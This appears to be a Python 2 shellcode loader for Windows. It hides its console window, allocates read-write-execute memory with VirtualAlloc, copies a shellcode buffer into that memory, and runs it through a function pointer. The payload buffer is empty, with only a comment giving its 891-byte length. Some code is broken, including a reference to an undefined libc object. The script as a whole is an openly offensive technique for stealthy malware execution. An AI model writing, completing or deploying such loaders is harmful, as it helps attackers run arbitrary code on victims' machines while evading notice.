from ctypes import *
import ctypes
# length: 891 bytes
buf = ""
#libc = CDLL('libc.so.6')
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
   buf = c_char_p(buffer)
   size = len(buffer)
   addr = libc.valloc(size)
   addr = c_void_p(addr)
   if 0 == addr: 
       raise Exception("Failed to allocate memory")
   memmove(addr, buf, size)
   if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
       raise Exception("Failed to set protection on buffer")
   return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
      if 666==666:
             ctypes.windll.user32.ShowWindow(whnd, 0)   
             ctypes.windll.kernel32.CloseHandle(whnd)
print ".................................."*666
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                       ctypes.c_int(len(shellcode)),
                                         ctypes.c_int(0x3000),
                                         ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                    buf,
                                    ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
